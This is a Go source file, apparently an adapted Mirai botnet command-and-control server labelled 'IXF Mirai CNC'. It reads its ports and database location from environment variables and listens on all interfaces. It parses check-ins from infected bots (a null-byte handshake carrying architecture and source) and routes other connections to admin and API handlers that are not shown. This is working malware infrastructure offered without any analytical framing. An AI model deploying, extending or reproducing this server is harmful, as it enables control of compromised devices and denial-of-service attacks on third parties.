// IXF Mirai CNC — env-driven ports + multi-DB (IXF_C2_DSN).
package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

var (
	clientList *ClientList
	database   *Database
)

func envOr(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func envInt(key string, fallback int) int {
	if v := os.Getenv(key); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			return n
		}
	}
	return fallback
}

func main() {
	dsn := envOr("IXF_C2_DSN", "sqlite://"+envOr("IXF_C2_SQLITE", ".tmp/ixf_c2/mirai.db"))
	bindHost := envOr("IXF_C2_BIND", "0.0.0.0")
	botPort := envInt("IXF_C2_PORT", envInt("IXF_C2_LPORT", 48101))
	apiPort := envInt("IXF_C2_API_PORT", botPort+1)

	database = NewDatabaseFromDSN(dsn)
	clientList = NewClientList()

	botAddr := fmt.Sprintf("%s:%d", bindHost, botPort)
	apiAddr := fmt.Sprintf("%s:%d", bindHost, apiPort)

	fmt.Printf("IXF Mirai CNC listening bot=%s api=%s dsn=%s\n", botAddr, apiAddr, redactDSN(dsn))

	tel, err := net.Listen("tcp", botAddr)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	api, err := net.Listen("tcp", apiAddr)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	go func() {
		for {
			conn, err := api.Accept()
			if err != nil {
				break
			}
			go apiHandler(conn)
		}
	}()

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}
}

func redactDSN(dsn string) string {
	if len(dsn) > 64 {
		return dsn[:32] + "..."
	}
	return dsn
}

func readExact(conn net.Conn, n int) ([]byte, error) {
	buf := make([]byte, n)
	got := 0
	for got < n {
		k, err := conn.Read(buf[got:])
		if err != nil || k <= 0 {
			return nil, err
		}
		got += k
	}
	return buf, nil
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 64)
	l, err := conn.Read(buf)
	if err != nil || l < 4 {
		return
	}

	if buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		arch := buf[3]
		source := ""
		if arch > 0 {
			pos := 4
			var slen int
			if l > pos {
				slen = int(buf[pos])
				pos++
			} else {
				slenB, err := readExact(conn, 1)
				if err != nil {
					return
				}
				slen = int(slenB[0])
			}
			if slen > 0 {
				var src []byte
				if l > pos {
					src = buf[pos:]
					if len(src) < slen {
						rest, err := readExact(conn, slen-len(src))
						if err != nil {
							return
						}
						src = append(src, rest...)
					}
				} else {
					src, err = readExact(conn, slen)
					if err != nil {
						return
					}
				}
				if len(src) >= slen {
					source = string(src[:slen])
				}
			}
		}
		NewBot(conn, arch, source).Handle()
		return
	}
	NewAdmin(conn).Handle()
}

func apiHandler(conn net.Conn) {
	defer conn.Close()
	NewApi(conn).Handle()
}
